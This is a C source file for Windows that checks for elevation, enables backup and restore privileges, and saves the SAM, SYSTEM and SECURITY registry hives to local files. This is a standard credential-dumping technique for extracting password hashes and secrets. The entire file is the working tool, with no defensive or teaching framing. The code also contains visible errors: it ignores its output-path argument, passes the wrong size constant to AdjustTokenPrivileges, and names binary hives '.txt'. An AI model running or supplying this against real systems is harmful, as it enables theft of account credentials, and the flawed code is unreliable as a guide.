#include <stdio.h>
#include <windows.h>

BOOL DumpRegKey(char *key, char *outFile) {
    HKEY hKey;
    LONG result;

    // Open the registry key with backup/restore options
    result = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        key,
        REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK,
        KEY_ALL_ACCESS | KEY_WOW64_64KEY,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        printf("Failed to open registry key: HKLM\\%s. Error code: %lu\n", key, result);
        return FALSE;
    }

    // Save the registry key to a file
    result = RegSaveKey(hKey, outFile, NULL);
    if (result != ERROR_SUCCESS) {
        printf("Failed to save registry key: HKLM\\%s. Error code: %lu\n", key, result);
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);
    printf("Exported HKLM\\%s to %s.\n", key, outFile);
    return TRUE;
}

BOOL EnablePrivilege(HANDLE tokenHandle, LPCSTR privilegeName) {
    TOKEN_PRIVILEGES tokenPrivileges;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, privilegeName, &luid)) {
        printf("LookupPrivilegeValue failed - Error code %lu\n", GetLastError());
        return FALSE;
    }

    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luid;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_ADJUST_PRIVILEGES), NULL, NULL)) {
        printf("AdjustTokenPrivileges failed - Error code: %lu\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL IsHighIntegrity() {
    HANDLE tokenHandle;
    BOOL result = FALSE;
    TOKEN_ELEVATION tokenElevation;
    DWORD tokenSize;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle)) {
        if (GetTokenInformation(tokenHandle, TokenElevation, &tokenElevation, sizeof(tokenElevation), &tokenSize)) {
            result = tokenElevation.TokenIsElevated;
        }
        CloseHandle(tokenHandle);
    }

    return result;
}

void usage(char *program) {
    printf("Usage:\t%s <path to write the keys>\n", program);
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        usage(argv[0]);
    }

    if (!IsHighIntegrity()) {
        printf("The process is NOT running with high integrity.\n");
        return 1;
    }

    HANDLE tokenHandle;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle)) {
        printf("Could not open the process token.\n");
        return 1;
    }

    if (!EnablePrivilege(tokenHandle, SE_BACKUP_NAME) || !EnablePrivilege(tokenHandle, SE_RESTORE_NAME)) {
        printf("Failed to enable required privileges.\n");
        CloseHandle(tokenHandle);
        return 1;
    }

    if (!DumpRegKey("SAM", "sam_dump.txt") ||
        !DumpRegKey("SYSTEM", "system_dump.txt") ||
        !DumpRegKey("SECURITY", "security_dump.txt")) {
        printf("Failed to dump some registry keys.\n");
    }

    CloseHandle(tokenHandle);
    return 0;
}
